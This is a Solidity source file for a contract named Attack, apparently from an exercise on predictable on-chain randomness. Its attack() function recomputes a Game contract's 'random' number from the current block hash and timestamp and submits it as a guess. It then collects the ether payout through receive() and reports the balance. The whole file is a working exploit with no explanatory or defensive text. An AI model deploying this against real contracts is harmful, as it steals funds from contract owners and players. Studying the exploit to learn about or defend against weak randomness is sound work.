// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./Game.sol";

contract Attack{
    //Instance of game contract
    Game game;

    constructor(address gameAddress) {
        game = Game(gameAddress);
    }

    function attack() public {
        uint256 guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
        //Calling guessNumber
        game.guessNumber(guess);
    }

    receive()external payable{

    }


    function getBalance()public view returns(uint){
        return address(this).balance;
    }

}